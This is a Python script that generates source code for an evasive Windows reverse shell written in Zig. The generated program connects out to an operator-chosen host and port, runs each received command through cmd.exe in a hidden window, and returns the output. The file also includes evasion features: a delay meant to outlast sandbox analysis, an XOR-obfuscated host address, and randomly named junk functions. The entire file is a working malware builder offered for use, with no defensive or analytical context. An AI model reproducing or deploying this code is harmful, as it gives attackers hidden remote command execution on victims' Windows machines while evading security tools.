#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Generate evasive pure-Zig Windows reverse shell source."""

from __future__ import annotations

import random
import string


def _junk_var_name() -> str:
    return "_" + "".join(random.choices(string.ascii_lowercase, k=random.randint(6, 12)))


def build_zig_shell_source(
    *,
    lhost: str,
    lport: int,
    sleep_ms: int = 0,
    obfuscate_host: bool = False,
) -> str:
    host = str(lhost).replace("\\", "\\\\").replace('"', '\\"')
    port = int(lport)
    sleep_block = ""
    if sleep_ms > 0:
        sleep_block = f"""
    // Delay execution to evade sandbox time limits
    std.time.sleep(@as(u64, {sleep_ms}) * std.time.ns_per_ms);
"""

    host_setup = f'const HOST = "{host}";'
    if obfuscate_host:
        # XOR-encode host octets; decoded at runtime
        encoded = [ord(c) ^ 0x5A for c in host]
        arr = ", ".join(str(b) for b in encoded)
        var = _junk_var_name()
        host_setup = f"""
const {var}: [{len(encoded)}]u8 = .{{{arr}}};
fn decodeHost(allocator: std.mem.Allocator) ![]u8 {{
    var out = try allocator.alloc(u8, {var}.len);
    for ({var}, 0..) |b, i| out[i] = b ^ 0x5A;
    return out;
}}
"""

    junk = _junk_var_name()
    junk2 = _junk_var_name()

    return f"""const std = @import("std");
const os = std.os;
const process = std.process;
const mem = std.mem;
const ws2_32 = os.windows.ws2_32;

{host_setup}
const PORT: u16 = {port};

const SOCKADDR_IN = extern struct {{
    family: u16,
    port: u16,
    addr: u32,
    zero: [8]u8,
}};

fn {junk}(n: u64) u64 {{
    var x: u64 = n ^ 0xDEADBEEF;
    var i: u32 = 0;
    while (i < 64) : (i += 1) x = x *% 6364136223846793005 +% 1;
    return x;
}}

fn connectHost(allocator: std.mem.Allocator, host: []const u8, port: u16) !ws2_32.SOCKET {{
    _ = {junk2}(@intFromPtr(host.ptr));
    var wsa: ws2_32.WSADATA = undefined;
    if (ws2_32.WSAStartup(0x0202, &wsa) != 0) return error.ConnectFailed;
    const sock = ws2_32.socket(2, 1, 0);
    if (sock == ws2_32.INVALID_SOCKET) return error.ConnectFailed;
    var host_buf: [256]u8 = undefined;
    if (host.len >= host_buf.len) return error.BadHost;
    @memcpy(host_buf[0..host.len], host);
    host_buf[host.len] = 0;
    var addr = SOCKADDR_IN{{
        .family = 2,
        .port = ws2_32.htons(port),
        .addr = ws2_32.inet_addr(&host_buf),
        .zero = [_]u8{{0}} ** 8,
    }};
    _ = allocator;
    if (ws2_32.connect(sock, @ptrCast(&addr), @sizeOf(SOCKADDR_IN)) != 0) return error.ConnectFailed;
    return sock;
}}

fn sendAll(sock: ws2_32.SOCKET, data: []const u8) !void {{
    var sent: usize = 0;
    while (sent < data.len) {{
        const n = ws2_32.send(sock, data.ptr + sent, @intCast(data.len - sent), 0);
        if (n == ws2_32.SOCKET_ERROR) return error.SendFailed;
        sent += @intCast(n);
    }}
}}

fn recvLine(allocator: std.mem.Allocator, sock: ws2_32.SOCKET, max_len: usize) ![]u8 {{
    var list = std.ArrayList(u8).empty;
    var buf: [1]u8 = undefined;
    while (list.items.len < max_len) {{
        const n = ws2_32.recv(sock, &buf, 1, 0);
        if (n == ws2_32.SOCKET_ERROR or n == 0) return error.Closed;
        if (buf[0] == '\\n') break;
        if (buf[0] != '\\r') try list.append(allocator, buf[0]);
    }}
    return try list.toOwnedSlice(allocator);
}}

fn execCmd(allocator: std.mem.Allocator, cmd: []const u8, cwd: ?[]const u8) ![]u8 {{
    const trimmed = mem.trim(u8, cmd, " \\r\\n");
    if (trimmed.len == 0) return allocator.dupe(u8, "");
    var args = std.ArrayList([]const u8).empty;
    defer args.deinit(allocator);
    try args.append(allocator, "cmd.exe");
    try args.append(allocator, "/c");
    try args.append(allocator, trimmed);
    var child = process.Child.init(args.items, allocator);
    child.cwd = cwd;
    child.stdin_behavior = .Ignore;
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;
    child.create_no_window = true;
    child.spawn() catch |e| {{
        return std.fmt.allocPrint(allocator, "Error: {{s}}\\n", .{{@errorName(e)}});
    }};
    var out = std.ArrayList(u8).empty;
    defer out.deinit(allocator);
    var err = std.ArrayList(u8).empty;
    defer err.deinit(allocator);
    child.collectOutput(allocator, &out, &err, 1024 * 1024) catch |e| {{
        return std.fmt.allocPrint(allocator, "Error: {{s}}\\n", .{{@errorName(e)}});
    }};
    _ = child.wait() catch {{}};
    if (err.items.len == 0) return allocator.dupe(u8, out.items);
    var combined = std.ArrayList(u8).empty;
    try combined.appendSlice(allocator, out.items);
    try combined.appendSlice(allocator, err.items);
    return try combined.toOwnedSlice(allocator);
}}

pub fn main() !void {{
    var gpa = std.heap.GeneralPurposeAllocator(.{{.safety = false}}){{}};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
{sleep_block}
    const cwd = process.getCwdAlloc(allocator) catch null;
    defer if (cwd) |c| allocator.free(c);
{"    const host = try decodeHost(allocator);\n    defer allocator.free(host);\n    const sock = try connectHost(allocator, host, PORT);" if obfuscate_host else "    const sock = try connectHost(allocator, HOST, PORT);"}
    defer _ = ws2_32.closesocket(sock);

    while (true) {{
        const cmd = recvLine(allocator, sock, 8192) catch break;
        defer allocator.free(cmd);
        const out = execCmd(allocator, cmd, cwd) catch |e| {{
            const msg = std.fmt.allocPrint(allocator, "Error: {{s}}\\n", .{{@errorName(e)}}) catch break;
            defer allocator.free(msg);
            sendAll(sock, msg) catch break;
            continue;
        }};
        defer allocator.free(out);
        sendAll(sock, out) catch break;
    }}
}}
"""
